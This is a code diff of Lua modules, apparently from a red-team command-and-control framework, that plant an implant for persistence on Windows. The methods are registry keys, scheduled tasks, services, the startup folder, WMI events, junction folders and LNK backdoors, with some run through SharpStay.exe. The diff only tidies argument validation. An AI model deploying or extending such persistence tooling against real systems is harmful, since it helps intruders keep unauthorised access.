@@ -55,11 +55,11 @@ local function run_Registry_Key(cmd, args)
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if command == "" then
@@ -122,11 +122,11 @@ function run_scheduled_task(cmd, args)
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if command == "" then
@@ -172,8 +172,8 @@ local function run_service_install(cmd, args)
     local error_control = cmd:Flags():GetString("error_control")
     local account_name = cmd:Flags():GetString("account_name")
 
-    if custom_file and use_malefic_as_custom_file then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
+    if use_malefic_as_custom_file and custom_file ~= "" then
+        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
         return
     end
 
@@ -181,21 +181,17 @@ local function run_service_install(cmd, args)
                        persistdefaults.servicename
     display_name = display_name ~= "" and display_name or
                        persistdefaults.displayname
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if drop_location ~= "" then
@@ -240,8 +236,8 @@ local function run_startup_folder(cmd, args)
     local username = session.Os.Username
     local drop_location
 
-    if custom_file and use_malefic_as_custom_file then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
+    if use_malefic_as_custom_file and custom_file ~= "" then
+        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
         return
     end
 
@@ -255,38 +251,14 @@ local function run_startup_folder(cmd, args)
                 filename
     end
 
-    if custom_file and use_malefic_as_custom_file then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
-
-    service_name = service_name ~= "" and service_name or
-                       persistdefaults.servicename
-    display_name = display_name ~= "" and display_name or
-                       persistdefaults.displayname
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
-
-    if drop_location == "" then drop_location = persistdefaults.droplocation end
-
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
-    end
-
-    if command == "" then
-        if drop_location ~= "" then
-            command = drop_location
-        else
-            command = persistdefaults.command
-        end
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if drop_location ~= "" then
@@ -316,28 +288,23 @@ local function run_wmi_event(cmd, args)
     local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                            "use_malefic_as_custom_file")
 
-    if custom_file and use_malefic_as_custom_file then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
+    if use_malefic_as_custom_file and custom_file ~= "" then
+        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
         return
     end
 
     eventname = eventname ~= "" and eventname or persistdefaults.eventname
-
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if command == "" then
@@ -384,35 +351,24 @@ local function run_JunctionFolder(cmd, args)
     local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                            "use_malefic_as_custom_file")
 
-    if custom_file and use_malefic_as_custom_file then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
+    if use_malefic_as_custom_file and custom_file ~= "" then
+        error("Cannot use both --custom_file and --use_malefic_as_custom_file")
         return
     end
+
     dllpath = dllpath ~= "" and dllpath or "C:\\windows\\system32\\ntdll.dll"
     guid = guid ~= "" and guid or "8d1c5b23-6907-4d3d-9da2-920b54d0753c"
-    if use_malefic_as_custom_file and custom_file ~= "" then
-        error("Cannot use both custom file and use_malefic_as_custom_file")
-        return
-    end
 
     if drop_location == "" then drop_location = persistdefaults.droplocation end
 
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
-    end
-
-    if command == "" then
-        if drop_location ~= "" then
-            command = drop_location
-        else
-            command = persistdefaults.command
-        end
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if drop_location ~= "" then
@@ -423,7 +379,8 @@ local function run_JunctionFolder(cmd, args)
         "action=JunctionFolder", "dllpath=" .. dllpath, "guid=" .. guid
     }
 
-    return execute_assembly(session, script_resource(file_path), sharp_args,
+    local sharpstay = "StayKit/SharpStay.exe"
+    return execute_assembly(session, script_resource(sharpstay), sharp_args,
                             true, false, false)
 end
 
@@ -458,11 +415,11 @@ local function run_newlnk(cmd, args)
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if command == "" then
@@ -526,11 +483,11 @@ local function run_backdoorlnk(cmd, args)
     local custom_file_content
     if use_malefic_as_custom_file then
         custom_file_content = self_artifact(session)
-    else
-        if custom_file == "" then
-            custom_file = persistdefaults.customfile
-        end
+    elseif custom_file ~= "" then
         custom_file_content = read(custom_file)
+    else
+        error("must specify --custom_file or --use_malefic_as_custom_file")
+        return
     end
 
     if command == "" then
